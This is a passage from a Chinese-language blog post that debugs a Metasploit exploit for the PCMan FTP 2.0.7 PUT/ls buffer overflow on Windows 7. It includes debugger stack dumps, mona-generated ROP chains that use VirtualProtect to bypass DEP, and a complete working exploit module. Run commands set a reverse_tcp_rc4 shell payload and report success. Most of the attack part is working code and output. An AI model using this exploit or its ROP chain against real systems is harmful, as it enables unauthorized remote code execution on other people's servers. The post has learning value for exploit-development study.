+http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/
+
+提到msf的payload前面有可能需要至少9个nop空间帮助完成payload的解码等工作，将30个nop改成9个nop试试9个nop会不会被改成随机的填充数据
+
+再次重新跟踪到eip=rop_gadgets中的第一个地址时，18ed64处的数据为：
+
+    0018ED64   778A45E1  ntdll_12.778A45E1
+    0018ED68   73C112D0  &lt;&amp;KERNEL32.VirtualProtect&gt;
+    0018ED6C   76969312  ole32.76969312
+    0018ED70   753C6833  返回到 KernelBa.753C6833
+    0018ED74   76B5E6E8  msvcrt.76B5E6E8
+    0018ED78   74916F14  riched20.74916F14
+    0018ED7C   76B93866  msvcrt.76B93866
+    0018ED80   FFFFFDFF
+    0018ED84   76BB2FD0  msctf.76BB2FD0
+    0018ED88   756BD259  shell32.756BD259
+    0018ED8C   74923CA7  riched20.74923CA7
+    0018ED90   FFFFFFC0
+    0018ED94   76CC4402  user32.76CC4402
+    0018ED98   753FD586  comdlg32.753FD586
+    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
+    0018EDA0   7647D27C  usp10.7647D27C
+    0018EDA4   759D4AAD  shell32.759D4AAD
+    0018EDA8   76CC4404  user32.76CC4404
+    0018EDAC   7364681F  comctl32.7364681F
+    0018EDB0   90909090
+    0018EDB4   4E43F842
+    0018EDB8   D64348F9
+    0018EDBC   4B46CCFD
+
+发现9个nop还是会被填充成随机数据(后来发现不是被win7x64系统的安全保护填充的，而是因为msf自带的nop有好几种，不只是9090,其他应该是类似的花指令)，\xcc到是一直没有被改写,试着不要9个nop了,将原来rop_gadges中的pushad+retn指令的地址改成一条jmp esp指令的地址,并在该地址后接payload数据,上面的dep off时的exploit.rb中的jmp esp的地址76061b1b在dep on时为call esp汇编语句的地址,不用在od中查找其他的了，call esp也可跳到后面的pyaload执行
+
+发送如下的rop_gadgets数据+不要nop+不要\xcc的数据到pcmanftp：
+
+---------------sploit data-------------
+def create_rop_chain()
+        rop_gadgets = 
+        [
+          0x778a45e1,  # POP ECX # RETN [knb3rdhmpg.dll] 
+          0x73c112d0,  # ptr to &amp;VirtualProtect() [IAT OLEACC.dll]
+          0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
+          0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
+          0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
+          0x74916f14,  # &amp; push esp # ret  [RICHED20.dll]
+          0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
+          0xfffffdff,  # Value to negate, will become 0x00000201
+          0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
+          0x756bd259,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
+          0x74923ca7,  # POP EAX # RETN [knb3rdhmpg.dll] 
+          0xffffffc0,  # Value to negate, will become 0x00000040
+          0x76cc4402,  # NEG EAX # RETN [winrnr.dll] 
+          0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
+          0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
+          0x7647d27c,  # &amp;Writable location [USP10.dll]
+          0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
+          0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
+          0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
+          0x90909090,  # nop
+          #0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
+          0x76061b1b,  #call esp
+        ].flatten.pack("V*")
+        return rop_gadgets
+      end
+
+
+      def exploit
+        connect_login
+    
+        print_status('Generating payload...')
+        sploit = rand_text_alpha(target['Offset'])
+    
+        #tmp = sploit
+        #print_status(tmp)
+        sploit &lt;&lt; create_rop_chain()
+        #sploit &lt;&lt; make_nops(9)
+        #sploit &lt;&lt; "\x41"*30
+        #sploit &lt;&lt; "\xcc"
+        sploit &lt;&lt; payload.encoded
+    
+        tmp=sploit
+        print_status(tmp)
+    
+        send_cmd( ["ls", sploit], false )
+        disconnect
+      end
+    end
+-------------------end-----------------
+
+再次跟踪到rop_gadges中的第一个地址，再f8直到上面sploit变量中的rop_gadget中的最后一个地址call esp的地址处程序报错，异常偏移为00a31b1b,难道是rop_gadgets中的地址串执行后没有实现后面的payload为栈中可执行?
+
+再次跟踪到rop_gadgets中的所有地址，发现最后jmp esp执行后程序报错，报出0018edb8处为异常偏移，而0018edb8处为payload开始的对应的堆栈窗口中地址,且每次0018edb8中的数据都不同，难道连payload都被随机数填充了？
+
+有比较大的可能性是执行完上面的rop_gadgets中的地址对应的指令后没有实现payload在栈中可执行，难道是不应该把mona生成的rop_gadges中的最后的pushad+retn对应的地址换成jmp esp的地址?
+
+再看看相关mona的资料，后面的pushad + retn应该是存在的，具体原因见下图virtualprotect_rop中所示
+</code></pre>
+</div>
+
+<p>图virtualprotect_rop
+<img src="https://raw.githubusercontent.com/xinghuacai/pic/master/virtualprotect_rop.png" /></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>mona生成的rop_gadgets中的最后一句中的pushad+retn指令的地址是必须的，正是通过pushad+retn的执行才可以导致virtualprotect的执行，实现的原理是在pushad之前将pushad的各个寄存器按照对应的顺序设置成刚好可以调用virtualprotect函数使后面的shellcode为可执行
+后来调试在进入virtualprotect_rop前最后一个函数00403e60的返回语句是retn 4而不是retn，所以rop_gadgets中的第一个地址后要加一个过渡的值，这里取为0x41414141
+
+----------------------------00403e60--------------------------------
+    00402A26    E8 35140000     call PCManFTP.00403E60
+    00402A2B    8A46 03         mov al,byte ptr ds:[esi+0x3]
+    
+        
+        00403E60    A1 40354400     mov eax,dword ptr ds:[0x443540]
+        00403E65    81EC 14080000   sub esp,0x814
+        00403E6B    85C0            test eax,eax
+        ...
+        ...
+        ...
+        00403FB1    5F              pop edi                                  ; kernel32.77032C3B
+        00403FB2    5E              pop esi                                  ; kernel32.77032C3B
+        00403FB3    81C4 14080000   add esp,0x814
+        00403FB9    C2 0400         retn 0x4
+-------------------------------end-----------------------------------
+
+在mona生成的最后rop_chains.txt文件中有virutalalloc过dep的rop_gadgets,也有virtualprotect过dep的rop_gadgets,刚开始以为是mona出错了，后来发现是用到了mona里面的virtualalloc过dep方式
+0day2中提到下面几种方法过dep:
+1.ZwSetInformationProcess:利用api彻底关闭dep
+2.VirtualProtect:利用api设置shellcode所在的内存空间为可执行
+3.VirtualAlloc:利用api申请可执行内存后将shellcode复制过去（需再用memcopy的api）
+4.利用可执行内存挑战dep
+5.利用.NET挑战dep
+6.利用Java applet挑战dep
+这里用的是2中的virtualprotect中的方法，mona生成的virtualalloc的方法应该是缺少了memcopy的chain,导致刚开始一直错误地以为mona错了
+最后再用mona生成的rop_gadgets如下：(第二个地址为新添加的0x41414141)
+--------------------new_rop_gadgets--------------------
+    rop_gadgets = 
+    [
+      0x77032c3b,  # POP EAX # RETN [kernel32.dll] 
+      0x41414141,  # added data to fit retn 4 from func 00403e60
+      0x73c112d0,  # ptr to &amp;VirtualProtect() [IAT OLEACC.dll]
+      0x76bb4412,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSCTF.dll] 
+      0x76408d2a,  # XCHG EAX,ESI # RETN [SHLWAPI.dll] 
+      0x76b607f0,  # POP EBP # RETN [msvcrt.dll] 
+      0x74916f14,  # &amp; push esp # ret  [RICHED20.dll]
+      0x7368b031,  # POP EAX # RETN [COMCTL32.dll] 
+      0xffffddff,  # Value to negate, will become 0x00000201
+      0x756c9a5c,  # NEG EAX # RETN [SHELL32.dll] 
+      0x767088bd,  # XCHG EAX,EBX # RETN [RPCRT4.dll] 
+      0x77031d7b,  # POP EAX # RETN [kernel32.dll] 
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x76cc4402,  # NEG EAX # RETN [SHELL32.dll] 
+      0x76b4ad98,  # XCHG EAX,EDX # RETN [SHELL32.dll] 
+      0x756b1cc1,  # POP ECX # RETN [SHELL32.dll] 
+      0x7647c663,  # &amp;Writable location [USP10.dll]
+      0x73756cf3,  # POP EDI # RETN [COMCTL32.dll] 
+      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
+      0x76b3f5d4,  # POP EAX # RETN [msvcrt.dll] 
+      0x90909090,  # nop
+      0x7366e16f,  # PUSHAD # RETN [COMCTL32.dll] 
+    ].flatten.pack("V*")
+------------------------end----------------------------
+再次开msf发payload，od附加,调试时发现如下图ebx_error错误
+</code></pre>
+</div>
+
+<p><img src="https://raw.githubusercontent.com/xinghuacai/pic/master/ebx_error.png" /></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>后来发现原来的mona中的virtualprotect是获得0x201(对应上面的0xffffddff,neg取反后为0x201)个可执行栈空间,以为是msf中的payload比这个长导致shellcode执行出错，后来将这个值设置为0xffffddff后没能关掉dep，应该是由于长度太大或许超过了栈空间的大小而导致virtualprotect函数的失败，于是没能成功关掉dep
+
+后来将这个值设置成0xfffffaff(neg取反后的结果比0x201大),又可以关掉dep了,只是后面的shellcode执行还是不成功
+
+怀疑有可能是像上图ebx_error中说的是ebx错了，也有可能是像0day2中说的ebp在溢出的过程中被破坏，这些只有再次从od中动态分析才可知
+
+后来还是自己想多了，mona之所以称为神器，在于的确是神器，怎会轻易出错
+
+换个payload马上成功,对msf还是不够熟悉！！一个payload不行可以换啊！！
+
+最后的exploit.rb如下，改成mypcmanftp-anti-dep.rb,放到/msfdirectory/modules/exploit/windows/my/目录下后执行下面的命令:
+use exploit/windows/my/mypcmanftp-anti-dep
+set payload windows/shell/reverse_tcp_rc4
+set RC4PASSWORD mypassword
+exploit
+成功弹shell
+----------------------------exploit.rb-------------------------------
+    # This module requires Metasploit: http://metasploit.com/download
+    # Current source: https://github.com/rapid7/metasploit-framework
+    ##
+    
+    require 'msf/core'
+    
+    class Metasploit3 &lt; Msf::Exploit::Remote
+      Rank = NormalRanking
+    
+      include Msf::Exploit::Remote::Ftp
+    
+      def initialize(info = {})
+        super(update_info(info,
+          'Name'           =&gt; 'PCMAN FTP Server Buffer Overflow - PUT Command',
+          'Description'    =&gt; %q{
+              This module exploits a buffer overflow vulnerability found in the PUT command of the
+              PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
+              credientials are enabled.
+          },
+          'Author'         =&gt;
+              [
+                'quanyechavshuo'
+              ],
+          'License'        =&gt; MSF_LICENSE,
+          'References'     =&gt;
+            [
+              [ 'EDB',   '37731'],
+              [ 'OSVDB',   '94624']
+            ],
+          'DefaultOptions' =&gt;
+            {
+              'EXITFUNC' =&gt; 'process'
+            },
+          'Payload'        =&gt;
+            {
+              'Space'   =&gt; 1000,
+              'BadChars'  =&gt; "\x00\x0A\x0D",
+            },
+          'Platform'       =&gt; 'win',
+          'Targets'        =&gt;
+            [
+              [ 'windows 7 x64',
+                {
+                  'Ret' =&gt; 0x77636aeb, # jmp esp C:\WINDOWS\system32\ntdll.dll
+                  'Offset' =&gt; 2008
+                }
+              ],
+            ],
+          'DisclosureDate' =&gt; 'Aug 07 2015',
+          'DefaultTarget'  =&gt; 0))
+      end
+    
+      def check
+        connect_login
+        disconnect
+    
+        if /220 PCMan's FTP Server 2\.0/ === banner
+          Exploit::CheckCode::Appears
+        else
+          Exploit::CheckCode::Safe
+        end
+      end
+
+  def create_rop_chain()
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = 
+    [
+      0x77032c3b,  # POP EAX # RETN [kernel32.dll] 
+      0x41414141,
+      0x73c112d0,  # ptr to &amp;VirtualProtect() [IAT OLEACC.dll]
+      0x76bb4412,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSCTF.dll] 
+      0x76408d2a,  # XCHG EAX,ESI # RETN [SHLWAPI.dll] 
+      0x76b607f0,  # POP EBP # RETN [msvcrt.dll] 
+      0x74916f14,  # &amp; push esp # ret  [RICHED20.dll]
+      0x7368b031,  # POP EAX # RETN [COMCTL32.dll] 
+      0xfffffaff,  # Value to negate, will become 0x00000201
+      0x756c9a5c,  # NEG EAX # RETN [SHELL32.dll] 
+      0x767088bd,  # XCHG EAX,EBX # RETN [RPCRT4.dll] 
+      0x77031d7b,  # POP EAX # RETN [kernel32.dll] 
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x76cc4402,  # NEG EAX # RETN [SHELL32.dll] 
+      0x76b4ad98,  # XCHG EAX,EDX # RETN [SHELL32.dll] 
+      0x756b1cc1,  # POP ECX # RETN [SHELL32.dll] 
+      0x7647c663,  # &amp;Writable location [USP10.dll]
+      0x73756cf3,  # POP EDI # RETN [COMCTL32.dll] 
+      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
+      0x76b3f5d4,  # POP EAX # RETN [msvcrt.dll] 
+      0x90909090,  # nop 
+      0x7366e16f,  # PUSHAD # RETN [COMCTL32.dll] 
+
+    ].flatten.pack("V*")
+
+    return rop_gadgets
+
+  end
+
+
+      def exploit
+        connect_login
+    
+        print_status('Generating payload...')
+        sploit = rand_text_alpha(target['Offset'])
+    
+        #tmp = sploit
+        #print_status(tmp)
+        sploit &lt;&lt; create_rop_chain()
+        #sploit &lt;&lt; make_nops(9) 这句产生的nop并非90
+        sploit &lt;&lt; "\x90"*30
+        #sploit &lt;&lt; "\x41"*30
+        #sploit &lt;&lt; "\xcc"
+        sploit &lt;&lt; payload.encoded
+    
+        #tmp=sploit
+        tmp=make_nops(9)
+        print_status(tmp)
+    
+        send_cmd( ["ls", sploit], false )
+        disconnect
+      end
+    
+    end
+
+-------------------------------end-----------------------------------
+</code></pre>
+</div>
+
+<p><img src="https://raw.githubusercontent.com/xinghuacai/pic/master/succeed.png" /></p>
 </span>
 
         
